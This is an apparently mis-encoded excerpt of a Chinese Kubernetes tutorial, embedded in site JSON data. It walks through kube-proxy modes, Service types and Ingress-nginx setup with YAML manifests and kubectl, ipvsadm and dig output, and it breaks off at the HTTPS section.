¥å£å°åå°±è½è®¿é®å°åé¢ç pod æå¡ã\n\n\n\nservice å¨å¾å¤æåµä¸åªæ¯ä¸ä¸ªæ¦å¿µï¼çæ­£èµ·ä½ç¨çå¶å®æ¯ kube-proxy æå¡è¿ç¨ï¼æ¯ä¸ª node èç¹ä¸é½è¿è¡çä¸ä¸ª kube-proxy æå¡è¿ç¨ãå½åå»º service çæ¶åä¼éè¿ api-server å etcd åå¥åå»ºç service çä¿¡æ¯ï¼è kube-proxy ä¼åºäºçå¬çæºå¶åç°è¿ç§ service çåå¨ï¼ç¶åå®ä¼å°ææ°ç service ä¿¡æ¯è½¬æ¢æå¯¹åºçè®¿é®è§åã\n\n\n\nè§åæ iptablesï¼ipvs ç­ï¼ç®åä»ç»ä¸ ipvs è§å\n\n[root@node1 ~]# ipvsadm -ln\nip virtual server version 1.2.1 (size=4096)\nprot localaddress:port scheduler flags\n  -> remoteaddress:port           forward weight activeconn inactconn\ntcp  10.97.97.97:80 rr\n  -> 10.244.1.39:80               masq    1      0          0\n  -> 10.244.1.40:80               masq    1      0          0\n  -> 10.244.2.33:80               masq    1      0          0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n10.97.97.97:80 æ¯ service æä¾çè®¿é®å¥å£ï¼å½è®¿é®è¿ä¸ªå¥å£çæ¶åï¼å¯ä»¥åç°åé¢æä¸ä¸ª pod çæå¡å¨ç­å¾è°ç¨ï¼kube-proxy ä¼åºäº rrï¼è½®è¯¢ï¼çç­ç¥ï¼å°è¯·æ±ååå°å¶ä¸­ä¸ä¸ª pod ä¸å»ï¼è¿ä¸ªè§åä¼åæ¶å¨éç¾¤åçææèç¹ä¸é½çæï¼æä»¥å¨ä»»ä½ä¸ä¸ªèç¹ä¸è®¿é®é½å¯ä»¥ã\n\nkube-proxy ç®åæ¯æä¸ç§å·¥ä½æ¨¡å¼:\nuserspace æ¨¡å¼\nuserspace æ¨¡å¼ä¸ï¼kube-proxy ä¼ä¸ºæ¯ä¸ä¸ª service åå»ºä¸ä¸ªçå¬ç«¯å£ï¼åå cluster ip çè¯·æ±è¢« iptables è§åéå®åå° kube-proxy çå¬çç«¯å£ä¸ï¼kube-proxy æ ¹æ® lb ç®æ³éæ©ä¸ä¸ªæä¾æå¡ç pod å¹¶åå¶å»ºç«é¾æ¥ï¼ä»¥å°è¯·æ±è½¬åå° pod ä¸ã è¯¥æ¨¡å¼ä¸ï¼kube-proxy åå½äºä¸ä¸ªåå±è´è´£åè¡¡å¨çè§è²ãç±äº kube-proxy è¿è¡å¨ userspace ä¸­ï¼å¨è¿è¡è½¬åå¤çæ¶ä¼å¢å åæ ¸åç¨æ·ç©ºé´ä¹é´çæ°æ®æ·è´ï¼è½ç¶æ¯è¾ç¨³å®ï¼ä½æ¯æçæ¯è¾ä½ã\n\n\n\niptables æ¨¡å¼\niptables æ¨¡å¼ä¸ï¼kube-proxy ä¸º service åç«¯çæ¯ä¸ª pod åå»ºå¯¹åºç iptables è§åï¼ç´æ¥å°åå cluster ip çè¯·æ±éå®åå°ä¸ä¸ª pod ipã è¯¥æ¨¡å¼ä¸ kube-proxy ä¸æ¿æåå±è´è´£åè¡¡å¨çè§è²ï¼åªè´è´£åå»º iptables è§åãè¯¥æ¨¡å¼çä¼ç¹æ¯è¾ userspace æ¨¡å¼æçæ´é«ï¼ä½ä¸è½æä¾çµæ´»ç lb ç­ç¥ï¼å½åç«¯ pod ä¸å¯ç¨æ¶ä¹æ æ³è¿è¡éè¯ã\n\n\n\nipvs æ¨¡å¼\nipvs æ¨¡å¼å iptables ç±»ä¼¼ï¼kube-proxy çæ§ pod çååå¹¶åå»ºç¸åºç ipvs è§åãipvs ç¸å¯¹ iptables è½¬åæçæ´é«ãé¤æ­¤ä»¥å¤ï¼ipvs æ¯ææ´å¤ç lb ç®æ³ã\n\n\n\næ­¤æ¨¡å¼å¿é¡»å®è£ ipvs åæ ¸æ¨¡åï¼å¦åä¼éçº§ä¸º iptablesï¼å¼å¯ ipvs\n\n[root@k8s-master01 ~]# kubectl edit cm kube-proxy -n kube-system\n# ä¿®æ¹mode: "ipvs"\n[root@k8s-master01 ~]# kubectl delete pod -l k8s-app=kube-proxy -n kube-system\n[root@node1 ~]# ipvsadm -ln\nip virtual server version 1.2.1 (size=4096)\nprot localaddress:port scheduler flags\n  -> remoteaddress:port           forward weight activeconn inactconn\ntcp  10.97.97.97:80 rr\n  -> 10.244.1.39:80               masq    1      0          0\n  -> 10.244.1.40:80               masq    1      0          0\n  -> 10.244.2.33:80               masq    1      0          0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# service ç±»å\n\nservice çèµæºæ¸åæä»¶ï¼\n\nkind: service  # èµæºç±»å\napiversion: v1  # èµæºçæ¬\nmetadata: # åæ°æ®\n  name: service # èµæºåç§°\n  namespace: dev # å½åç©ºé´\nspec: # æè¿°\n  selector: # æ ç­¾éæ©å¨ï¼ç¨äºç¡®å®å½åserviceä»£çåªäºpod\n    app: nginx\n  type: # serviceç±»åï¼æå®serviceçè®¿é®æ¹å¼\n  clusterip:  # èææå¡çipå°å\n  sessionaffinity: # sessionäº²åæ§ï¼æ¯æclientipãnoneä¸¤ä¸ªéé¡¹ï¼å¯ä»¥æåä¸ä¸ªæºçè¯·æ±ï¼åå°ä¸ä¸ªå·ä½çpodä¸\n  ports: # ç«¯å£ä¿¡æ¯\n    - protocol: tcp \n      port: 3017  # serviceç«¯å£\n      targetport: 5003 # podç«¯å£\n      nodeport: 31122 # ä¸»æºç«¯å£\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\ntypeï¼\n\n * clusteripï¼é»è®¤å¼ï¼å®æ¯ kubernetes ç³»ç»èªå¨åéçèæ ipï¼åªè½å¨éç¾¤åé¨è®¿é®\n * nodeportï¼å° service éè¿æå®ç node ä¸çç«¯å£æ´é²ç»å¤é¨ï¼éè¿æ­¤æ¹æ³ï¼å°±å¯ä»¥å¨éç¾¤å¤é¨è®¿é®æå¡\n * loadbalancerï¼ä½¿ç¨å¤æ¥è´è½½åè¡¡å¨å®æå°æå¡çè´è½½ååï¼æ³¨ææ­¤æ¨¡å¼éè¦å¤é¨äºç¯å¢æ¯æ\n * externalnameï¼ æéç¾¤å¤é¨çæå¡å¼å¥éç¾¤åé¨ï¼ç´æ¥ä½¿ç¨\n\n\n# service ä½¿ç¨\n\n\n# å®éªç¯å¢åå¤\n\nå¨ä½¿ç¨ service ä¹åï¼é¦åå©ç¨ deployment åå»ºåº 3 ä¸ª podï¼æ³¨æè¦ä¸º pod è®¾ç½® app=nginx-pod çæ ç­¾\nåå»º deployment.yamlï¼åå®¹å¦ä¸ï¼\n\napiversion: apps/v1\nkind: deployment      \nmetadata:\n  name: pc-deployment\n  namespace: dev\nspec: \n  replicas: 3\n  selector:\n    matchlabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerport: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n[root@k8s-master01 ~]# kubectl create -f deployment.yaml\ndeployment.apps/pc-deployment created\n\n# æ¥çpodè¯¦æ\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide --show-labels\nname                             ready   status     ip            node     labels\npc-deployment-66cb59b984-8p84h   1/1     running    10.244.1.39   node1    app=nginx-pod\npc-deployment-66cb59b984-vx8vx   1/1     running    10.244.2.33   node2    app=nginx-pod\npc-deployment-66cb59b984-wnncx   1/1     running    10.244.1.40   node1    app=nginx-pod\n\n# ä¸ºäºæ¹ä¾¿åé¢çæµè¯ï¼ä¿®æ¹ä¸ä¸å°nginxçindex.htmlé¡µé¢ï¼ä¸å°ä¿®æ¹çipå°åä¸ä¸è´ï¼\n# kubectl exec -it pc-deployment-66cb59b984-8p84h -n dev /bin/sh\n# echo "10.244.1.39" > /usr/share/nginx/html/index.html\n\n#ä¿®æ¹å®æ¯ä¹åï¼è®¿é®æµè¯\n[root@k8s-master01 ~]# curl 10.244.1.39\n10.244.1.39\n[root@k8s-master01 ~]# curl 10.244.2.33\n10.244.2.33\n[root@k8s-master01 ~]# curl 10.244.1.40\n10.244.1.40\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# clusterip ç±»åç service\n\næ¯éç¾¤åé¨å°åï¼åªè½éè¿ node éç¾¤åé¨è®¿é®ï¼åå»º service-clusterip.yaml æä»¶\n\napiversion: v1\nkind: service\nmetadata:\n  name: service-clusterip\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  clusterip: 10.97.97.97 # serviceçipå°åï¼å¦æä¸åï¼é»è®¤ä¼çæä¸ä¸ª\n  type: clusterip\n  ports:\n  - port: 80  # serviceç«¯å£       \n    targetport: 80 # podç«¯å£\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# åå»ºservice\n[root@k8s-master01 ~]# kubectl create -f service-clusterip.yaml\nservice/service-clusterip created\n\n# æ¥çservice\n[root@k8s-master01 ~]# kubectl get svc -n dev -o wide\nname                type        cluster-ip    external-ip   port(s)   age   selector\nservice-clusterip   clusterip   10.97.97.97   <none>        80/tcp    13s   app=nginx-pod\n\n# æ¥çserviceçè¯¦ç»ä¿¡æ¯\n# å¨è¿éæä¸ä¸ªendpointsåè¡¨ï¼éé¢å°±æ¯å½åserviceå¯ä»¥è´è½½å°çæå¡å¥å£\n[root@k8s-master01 ~]# kubectl describe svc service-clusterip -n dev\nname:              service-clusterip\nnamespace:         dev\nlabels:            <none>\nannotations:       <none>\nselector:          app=nginx-pod\ntype:              clusterip\nip:                10.97.97.97\nport:              <unset>  80/tcp\ntargetport:        80/tcp\nendpoints:         10.244.1.39:80,10.244.1.40:80,10.244.2.33:80\nsession affinity:  none\nevents:            <none>\n\n# æ¥çipvsçæ å°è§å\n[root@k8s-master01 ~]# ipvsadm -ln\ntcp  10.97.97.97:80 rr\n  -> 10.244.1.39:80               masq    1      0          0\n  -> 10.244.1.40:80               masq    1      0          0\n  -> 10.244.2.33:80               masq    1      0          0\n\n# è®¿é®10.97.97.97:80è§å¯ææ\n[root@k8s-master01 ~]# curl 10.97.97.97:80\n10.244.2.33\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\nendpoint\n\nendpoint æ¯ kubernetes ä¸­çä¸ä¸ªèµæºå¯¹è±¡ï¼å­å¨å¨ etcd ä¸­ï¼ç¨æ¥è®°å½ä¸ä¸ª service å¯¹åºçææ pod çè®¿é®å°åï¼å®æ¯æ ¹æ® service éç½®æä»¶ä¸­ selector æè¿°äº§ççã\n\nä¸ä¸ª service ç±ä¸ç» pod ç»æï¼è¿äº pod éè¿ endpoints æ´é²åºæ¥ï¼endpoints æ¯å®ç°å®éæå¡çç«¯ç¹éåãæ¢å¥è¯è¯´ï¼service å pod ä¹é´çèç³»æ¯éè¿ endpoints å®ç°çã\n\n\n\nè´è½½ååç­ç¥\nå¯¹ service çè®¿é®è¢«ååå°äºåç«¯ç pod ä¸å»ï¼ç®å kubernetes æä¾äºä¸¤ç§è´è½½ååç­ç¥ï¼\n\n * å¦æä¸å®ä¹ï¼é»è®¤ä½¿ç¨ kube-proxy çç­ç¥ï¼æ¯å¦éæºãè½®è¯¢\n * åºäºå®¢æ·ç«¯å°åçä¼è¯ä¿ææ¨¡å¼ï¼å³æ¥èªåä¸ä¸ªå®¢æ·ç«¯åèµ·çææè¯·æ±é½ä¼è½¬åå°åºå®çä¸ä¸ª pod ä¸\n   æ­¤æ¨¡å¼å¯ä»¥ä½¿å¨ spec ä¸­æ·»å  sessionaffinity:clientip éé¡¹\n\n# æ¥çipvsçæ å°è§åãrr è½®è¯¢ã\n[root@k8s-master01 ~]# ipvsadm -ln\ntcp  10.97.97.97:80 rr\n  -> 10.244.1.39:80               masq    1      0          0\n  -> 10.244.1.40:80               masq    1      0          0\n  -> 10.244.2.33:80               masq    1      0          0\n\n# å¾ªç¯è®¿é®æµè¯\n[root@k8s-master01 ~]# while true;do curl 10.97.97.97:80; sleep 5; done;\n10.244.1.40\n10.244.1.39\n10.244.2.33\n10.244.1.40\n10.244.1.39\n10.244.2.33\n\n# ä¿®æ¹ååç­ç¥----sessionaffinity:clientip\n\n# æ¥çipvsè§åãpersistent ä»£è¡¨æä¹ã\n[root@k8s-master01 ~]# ipvsadm -ln\ntcp  10.97.97.97:80 rr persistent 10800\n  -> 10.244.1.39:80               masq    1      0          0\n  -> 10.244.1.40:80               masq    1      0          0\n  -> 10.244.2.33:80               masq    1      0          0\n\n# å¾ªç¯è®¿é®æµè¯\n[root@k8s-master01 ~]# while true;do curl 10.97.97.97; sleep 5; done;\n10.244.2.33\n10.244.2.33\n10.244.2.33\n  \n# å é¤service\n[root@k8s-master01 ~]# kubectl delete -f service-clusterip.yaml\nservice "service-clusterip" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# headliness ç±»åç service\n\nå¨æäºåºæ¯ä¸­ï¼å¼åäººåå¯è½ä¸æ³ä½¿ç¨ service æä¾çè´è½½åè¡¡åè½ï¼èå¸æèªå·±æ¥æ§å¶è´è½½åè¡¡ç­ç¥ï¼éå¯¹è¿ç§æåµï¼kubernetes æä¾äº headliness serviceï¼è¿ç±» service ä¸ä¼åé cluster ipï¼å¦ææ³è¦è®¿é® serviceï¼åªè½éè¿ service çååè¿è¡æ¥è¯¢ã\n\nåå»º service-headliness.yaml\n\napiversion: v1\nkind: service\nmetadata:\n  name: service-headliness\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  clusterip: none # å°clusteripè®¾ç½®ä¸ºnoneï¼å³å¯åå»ºheadliness service\n  type: clusterip\n  ports:\n  - port: 80    \n    targetport: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# åå»ºservice\n[root@k8s-master01 ~]# kubectl create -f service-headliness.yaml\nservice/service-headliness created\n\n# è·åserviceï¼ åç°cluster-ipæªåé\n[root@k8s-master01 ~]# kubectl get svc service-headliness -n dev -o wide\nname                 type        cluster-ip   external-ip   port(s)   age   selector\nservice-headliness   clusterip   none         <none>        80/tcp    11s   app=nginx-pod\n\n# æ¥çserviceè¯¦æ\n[root@k8s-master01 ~]# kubectl describe svc service-headliness  -n dev\nname:              service-headliness\nnamespace:         dev\nlabels:            <none>\nannotations:       <none>\nselector:          app=nginx-pod\ntype:              clusterip\nip:                none\nport:              <unset>  80/tcp\ntargetport:        80/tcp\nendpoints:         10.244.1.39:80,10.244.1.40:80,10.244.2.33:80\nsession affinity:  none\nevents:            <none>\n\n# æ¥çååçè§£ææåµ\n[root@k8s-master01 ~]# kubectl exec -it pc-deployment-66cb59b984-8p84h -n dev /bin/sh\n/ # cat /etc/resolv.conf\nnameserver 10.96.0.10\nsearch dev.svc.cluster.local svc.cluster.local cluster.local\n\n[root@k8s-master01 ~]# dig @10.96.0.10 service-headliness.dev.svc.cluster.local\nservice-headliness.dev.svc.cluster.local. 30 in a 10.244.1.40\nservice-headliness.dev.svc.cluster.local. 30 in a 10.244.1.39\nservice-headliness.dev.svc.cluster.local. 30 in a 10.244.2.33\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# nodeport ç±»åç service\n\nå¨ä¹åçæ ·ä¾ä¸­ï¼åå»ºç service ç ip å°ååªæéç¾¤åé¨æå¯ä»¥è®¿é®ï¼å¦æå¸æå° service æ´é²ç»éç¾¤å¤é¨ä½¿ç¨ï¼é£ä¹å°±è¦ä½¿ç¨å°å¦å¤ä¸ç§ç±»åç serviceï¼ç§°ä¸º nodeport ç±»åãnodeport çå·¥ä½åçå¶å®å°±æ¯å° service çç«¯å£æ å°å° node çä¸ä¸ªç«¯å£ä¸ï¼ç¶åå°±å¯ä»¥éè¿ nodeip:nodeport æ¥è®¿é® service äºã\n\n\n\nåå»º service-nodeport.yaml\n\napiversion: v1\nkind: service\nmetadata:\n  name: service-nodeport\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  type: nodeport # serviceç±»å\n  ports:\n  - port: 80\n    nodeport: 30002 # æå®ç»å®çnodeçç«¯å£(é»è®¤çåå¼èå´æ¯ï¼30000-32767), å¦æä¸æå®ï¼ä¼é»è®¤åé\n    targetport: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# åå»ºservice\n[root@k8s-master01 ~]# kubectl create -f service-nodeport.yaml\nservice/service-nodeport created\n\n# æ¥çservice\n[root@k8s-master01 ~]# kubectl get svc -n dev -o wide\nname               type       cluster-ip      external-ip   port(s)       selector\nservice-nodeport   nodeport   10.105.64.191   <none>        80:30002/tcp  app=nginx-pod\n\n# æ¥ä¸æ¥å¯ä»¥éè¿çµèä¸»æºçæµè§å¨å»è®¿é®éç¾¤ä¸­ä»»æä¸ä¸ªnodeipç30002ç«¯å£ï¼å³å¯è®¿é®å°pod\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# loadbalancer ç±»åç service\n\nloadbalancer å nodeport å¾ç¸ä¼¼ï¼ç®çé½æ¯åå¤é¨æ´é²ä¸ä¸ªç«¯å£ï¼åºå«å¨äº loadbalancer ä¼å¨éç¾¤çå¤é¨åæ¥åä¸ä¸ªè´è½½åè¡¡è®¾å¤ï¼èè¿ä¸ªè®¾å¤éè¦å¤é¨ç¯å¢æ¯æçï¼å¤é¨æå¡åéå°è¿ä¸ªè®¾å¤ä¸çè¯·æ±ï¼ä¼è¢«è®¾å¤è´è½½ä¹åè½¬åå°éç¾¤ä¸­ã\n\n\n\n\n# externalname ç±»åç service\n\nexternalname ç±»åç service ç¨äºå¼å¥éç¾¤å¤é¨çæå¡ï¼å®éè¿ externalname å±æ§æå®å¤é¨ä¸ä¸ªæå¡çå°åï¼ç¶åå¨éç¾¤åé¨è®¿é®æ­¤ service å°±å¯ä»¥è®¿é®å°å¤é¨çæå¡äºã\n\n\n\napiversion: v1\nkind: service\nmetadata:\n  name: service-externalname\n  namespace: dev\nspec:\n  type: externalname # serviceç±»å\n  externalname: www.baidu.com  #æ¹æipå°åä¹å¯ä»¥\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# åå»ºservice\n[root@k8s-master01 ~]# kubectl  create -f service-externalname.yaml\nservice/service-externalname created\n\n# ååè§£æ\n[root@k8s-master01 ~]# dig @10.96.0.10 service-externalname.dev.svc.cluster.local\nservice-externalname.dev.svc.cluster.local. 30 in cname www.baidu.com.\nwww.baidu.com.          30      in      cname   www.a.shifen.com.\nwww.a.shifen.com.       30      in      a       39.156.66.18\nwww.a.shifen.com.       30      in      a       39.156.66.14\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n',charsets:{cjk:!0}},{title:"kubernetes(å) Ingressä»ç»åä½¿ç¨",frontmatter:{title:"kubernetes(å) Ingressä»ç»åä½¿ç¨",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/609",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/609.kubernetes(%E5%8D%81)%20Ingress%E4%BB%8B%E7%BB%8D%E5%8F%8A%E4%BD%BF%E7%94%A8.html",relativePath:"01.è¿ç»´/60.Kubernetes/609.kubernetes(å) Ingressä»ç»åä½¿ç¨.md",key:"v-21c7009a",path:"/kubernetes/609/",headers:[{level:2,title:"Ingressä»ç»",slug:"ingressä»ç»",normalizedTitle:"ingress ä»ç»",charIndex:2},{level:2,title:"Ingressä½¿ç¨",slug:"ingressä½¿ç¨",normalizedTitle:"ingress ä½¿ç¨",charIndex:895},{level:3,title:"ç¯å¢åå¤",slug:"ç¯å¢åå¤",normalizedTitle:"ç¯å¢åå¤",charIndex:910},{level:3,title:"Httpä»£ç",slug:"httpä»£ç",normalizedTitle:"http ä»£ç",charIndex:3972},{level:3,title:"Httpsä»£ç",slug:"httpsä»£ç",normalizedTitle:"https ä»£ç",charIndex:5317}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"Ingressä»ç» Ingressä½¿ç¨ ç¯å¢åå¤ Httpä»£ç Httpsä»£ç",content:'# Ingress ä»ç»\n\nå¨åé¢è¯¾ç¨ä¸­å·²ç»æå°ï¼Service å¯¹éç¾¤ä¹å¤æ´é²æå¡çä¸»è¦æ¹å¼æä¸¤ç§ï¼NotePort å LoadBalancerï¼ä½æ¯è¿ä¸¤ç§æ¹å¼ï¼é½æä¸å®çç¼ºç¹ï¼\n\n * NodePort æ¹å¼çç¼ºç¹æ¯ä¼å ç¨å¾å¤éç¾¤æºå¨çç«¯å£ï¼é£ä¹å½éç¾¤æå¡åå¤çæ¶åï¼è¿ä¸ªç¼ºç¹å°±æåææ¾\n * LB æ¹å¼çç¼ºç¹æ¯æ¯ä¸ª service éè¦ä¸ä¸ª LBï¼æµªè´¹ãéº»ç¦ï¼å¹¶ä¸éè¦ kubernetes ä¹å¤è®¾å¤çæ¯æ\n\nåºäºè¿ç§ç°ç¶ï¼kubernetes æä¾äº Ingress èµæºå¯¹è±¡ï¼Ingress åªéè¦ä¸ä¸ª NodePort æèä¸ä¸ª LB å°±å¯ä»¥æ»¡è¶³æ´é²å¤ä¸ª Service çéæ±ãå·¥ä½æºå¶å¤§è´å¦ä¸å¾è¡¨ç¤ºï¼\n\n\n\nå®éä¸ï¼Ingress ç¸å½äºä¸ä¸ª 7 å±çè´è½½åè¡¡å¨ï¼æ¯ kubernetes å¯¹ååä»£ççä¸ä¸ªæ½è±¡ï¼å®çå·¥ä½åçç±»ä¼¼äº Nginxï¼å¯ä»¥çè§£æå¨ Ingress éå»ºç«è¯¸å¤æ å°è§åï¼Ingress Controller éè¿çå¬è¿äºéç½®è§åå¹¶è½¬åæ Nginx çååä»£çéç½®ï¼ç¶åå¯¹å¤é¨æä¾æå¡ãå¨è¿éæä¸¤ä¸ªæ ¸å¿æ¦å¿µï¼\n\n * ingressï¼kubernetes ä¸­çä¸ä¸ªå¯¹è±¡ï¼ä½ç¨æ¯å®ä¹è¯·æ±å¦ä½è½¬åå° service çè§å\n * ingress controllerï¼å·ä½å®ç°ååä»£çåè´è½½åè¡¡çç¨åºï¼å¯¹ ingress å®ä¹çè§åè¿è¡è§£æï¼æ ¹æ®éç½®çè§åæ¥å®ç°è¯·æ±è½¬åï¼å®ç°æ¹å¼æå¾å¤ï¼æ¯å¦ Nginx, Contour, Haproxy ç­ç­\n\nIngressï¼ä»¥ Nginx ä¸ºä¾ï¼çå·¥ä½åçå¦ä¸ï¼\n\n 1. ç¨æ·ç¼å Ingress è§åï¼è¯´æåªä¸ªååå¯¹åº kubernetes éç¾¤ä¸­çåªä¸ª Service\n 2. Ingress æ§å¶å¨å¨ææç¥ Ingress æå¡è§åçååï¼ç¶åçæä¸æ®µå¯¹åºç Nginx ååä»£çéç½®\n 3. Ingress æ§å¶å¨ä¼å°çæç Nginx éç½®åå¥å°ä¸ä¸ªè¿è¡çç Nginx æå¡ä¸­ï¼å¹¶å¨ææ´æ°\n 4. å°æ­¤ä¸ºæ­¢ï¼å¶å®çæ­£å¨å·¥ä½çå°±æ¯ä¸ä¸ª Nginx äºï¼åé¨éç½®äºç¨æ·å®ä¹çè¯·æ±è½¬åè§å\n\n\n\n\n# Ingress ä½¿ç¨\n\n\n# ç¯å¢åå¤\n\næ­å»º ingress ç¯å¢\n\n# åå»ºæä»¶å¤¹\n[root@k8s-master01 ~]# mkdir ingress-controller\n[root@k8s-master01 ~]# cd ingress-controller/\n\n# è·åingress-nginxï¼æ¬æ¬¡æ¡ä¾ä½¿ç¨çæ¯0.30çæ¬\n[root@k8s-master01 ingress-controller]# wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/mandatory.yaml\n[root@k8s-master01 ingress-controller]# wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/provider/baremetal/service-nodeport.yaml\n\n# ä¿®æ¹mandatory.yamlæä»¶ä¸­çä»åº\n# ä¿®æ¹quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.30.0\n# ä¸ºquay-mirror.qiniu.com/kubernetes-ingress-controller/nginx-ingress-controller:0.30.0\n# åå»ºingress-nginx\n[root@k8s-master01 ingress-controller]# kubectl apply -f ./\n\n# æ¥çingress-nginx\n[root@k8s-master01 ingress-controller]# kubectl get pod -n ingress-nginx\nNAME                                           READY   STATUS    RESTARTS   AGE\npod/nginx-ingress-controller-fbf967dd5-4qpbp   1/1     Running   0          12h\n\n# æ¥çservice\n[root@k8s-master01 ingress-controller]# kubectl get svc -n ingress-nginx\nNAME            TYPE       CLUSTER-IP     EXTERNAL-IP   PORT(S)                      AGE\ningress-nginx   NodePort   10.98.75.163   <none>        80:32240/TCP,443:31335/TCP   11h\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nåå¤ service å pod\nä¸ºäºåé¢çå®éªæ¯è¾æ¹ä¾¿ï¼åå»ºå¦ä¸å¾æç¤ºçæ¨¡å\n\n\n\nåå»º tomcat-nginx.yaml\n\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  namespace: dev\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerPort: 80\n\n---\n\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tomcat-deployment\n  namespace: dev\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: tomcat-pod\n  template:\n    metadata:\n      labels:\n        app: tomcat-pod\n    spec:\n      containers:\n      - name: tomcat\n        image: tomcat:8.5-jre10-slim\n        ports:\n        - containerPort: 8080\n\n---\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: nginx-service\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  clusterIP: None\n  type: ClusterIP\n  ports:\n  - port: 80\n    targetPort: 80\n\n---\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: tomcat-service\n  namespace: dev\nspec:\n  selector:\n    app: tomcat-pod\n  clusterIP: None\n  type: ClusterIP\n  ports:\n  - port: 8080\n    targetPort: 8080\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n\n\n# åå»º\n[root@k8s-master01 ~]# kubectl create -f tomcat-nginx.yaml\n\n# æ¥ç\n[root@k8s-master01 ~]# kubectl get svc -n dev\nNAME             TYPE        CLUSTER-IP   EXTERNAL-IP   PORT(S)    AGE\nnginx-service    ClusterIP   None         <none>        80/TCP     48s\ntomcat-service   ClusterIP   None         <none>        8080/TCP   48s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# Http ä»£ç\n\nåå»º ingress-http.yaml\n\napiVersion: extensions/v1beta1\nkind: Ingress\nmetadata:\n  name: ingress-http\n  namespace: dev\nspec:\n  rules:\n  - host: nginx.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          serviceName: nginx-service\n          servicePort: 80\n  - host: tomcat.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          serviceName: tomcat-service\n          servicePort: 8080\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n# åå»º\n[root@k8s-master01 ~]# kubectl create -f ingress-http.yaml\ningress.extensions/ingress-http created\n\n# æ¥ç\n[root@k8s-master01 ~]# kubectl get ing ingress-http -n dev\nNAME           HOSTS                                  ADDRESS   PORTS   AGE\ningress-http   nginx.itheima.com,tomcat.itheima.com             80      22s\n\n# æ¥çè¯¦æ\n[root@k8s-master01 ~]# kubectl describe ing ingress-http  -n dev\n...\nRules:\nHost                Path  Backends\n----                ----  --------\nnginx.itheima.com   / nginx-service:80 (10.244.1.96:80,10.244.1.97:80,10.244.2.112:80)\ntomcat.itheima.com  / tomcat-service:8080(10.244.1.94:8080,10.244.1.95:8080,10.244.2.111:8080)\n...\n\n# æ¥ä¸æ¥,å¨æ¬å°çµèä¸éç½®hostæä»¶,è§£æä¸é¢çä¸¤ä¸ªååå°192.168.109.100(master)ä¸\n# ç¶å,å°±å¯ä»¥åå«è®¿é®tomcat.itheima.com:32240  å  nginx.itheima.com:32240 æ¥çææäº\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# Https 